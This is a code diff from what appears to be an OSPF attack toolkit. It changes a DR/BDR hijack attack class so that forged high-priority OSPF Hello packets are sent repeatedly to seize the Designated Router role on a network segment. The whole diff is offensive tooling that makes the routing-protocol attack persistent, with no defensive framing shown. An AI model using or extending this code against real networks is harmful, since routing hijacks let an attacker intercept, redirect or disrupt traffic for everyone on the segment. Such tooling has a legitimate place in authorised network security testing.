@@ -8,6 +8,7 @@ class DRBDRHijackAttack(BaseAttack):
     name = "dr-bdr-hijack"
     description = "注入高优先级 Hello 抢占 DR/BDR 角色"
     category = AttackCategory.ADJACENCY
+    needs_repeated = True
     config: HelloInjectionConfig
 
     def setup(self) -> None:
@@ -17,19 +18,25 @@ class DRBDRHijackAttack(BaseAttack):
             max_packets=self.config.max_packets,
         )
 
-    def launch(self) -> AttackResult:
-        from ospf_attack.network.adapter import get_local_ip
-        src_ip = get_local_ip(self.config.iface)
+    def send_one_round(self) -> bool:
+        src_ip = getattr(self, "_src_ip", None)
+        if src_ip is None:
+            from ospf_attack.network.adapter import get_local_ip
+            src_ip = get_local_ip(self.config.iface)
+            self._src_ip = src_ip
         pkt = build_hello_packet(
             router_id=self.config.router_id,
             area_id=self.config.area_id,
-            src_ip=src_ip,
+            src_ip=self._src_ip,
             dst_ip=OSPF_MULTICAST_ALL,
             router_priority=self.config.router_priority,
             hello_interval=self.config.hello_interval,
             router_dead_interval=self.config.router_dead_interval,
         )
-        ok = self._sender.send_raw(pkt)
+        return self._sender.send_raw(pkt)
+
+    def launch(self) -> AttackResult:
+        ok = self.send_one_round()
         return AttackResult(
             success=ok,
             packets_sent=self._sender.sent_count,
@@ -38,7 +45,7 @@ class DRBDRHijackAttack(BaseAttack):
         )
 
     def verify(self) -> bool:
-        return self._sender.sent_count > 0
+        return self._sender.sent_count > 1
 
     def teardown(self) -> None:
         pass
